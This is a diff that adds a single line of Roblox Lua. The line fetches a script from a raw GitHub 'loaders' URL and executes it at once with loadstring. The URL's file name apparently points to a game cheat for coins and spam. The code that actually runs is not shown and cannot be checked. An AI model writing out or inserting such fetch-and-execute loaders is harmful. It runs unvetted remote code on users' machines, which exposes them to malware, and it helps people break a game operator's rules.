@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/ed-char-1-5x-coins-epic-tbsobr-spam7-t3jsmspzo587ky.lua"))()
